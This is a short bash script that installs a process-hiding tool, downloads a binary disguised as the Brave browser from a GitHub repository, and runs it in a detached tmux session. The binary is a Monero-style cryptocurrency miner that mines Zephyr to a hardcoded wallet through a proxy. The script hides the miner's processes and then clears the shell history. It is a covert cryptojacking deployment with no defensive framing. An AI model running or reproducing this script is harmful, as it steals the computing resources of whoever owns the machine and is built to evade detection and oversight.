#!/bin/bash

sudo apt-get update && sudo apt-get install -y gcc npm dos2unix dnsutils
sudo npm install -g node-process-hider
sudo ph add Brave
sudo ph add ./Brave
sudo ph add tmux
sudo ph add racing

cd /home
sudo wget https://github.com/cxzac/n/raw/main/Brave
sudo chmod +x Brave

tmux new-session -d -s 01 'sudo ./Brave -a rx -o de.zephyr.herominers.com:1123 -u ZEPHsA7M7JaXUgag96fuZbZPQZcDGxG6mJHr6mAcKNKAcqoDTPYCQavRdkokVk3Zk1Z62dbAU7JMkA89NVuPq3Ju6SrqfZ9idKk.z000v00 -t 8 -p x --proxy 174.75.211.222:4145'

clear
history -c
clear
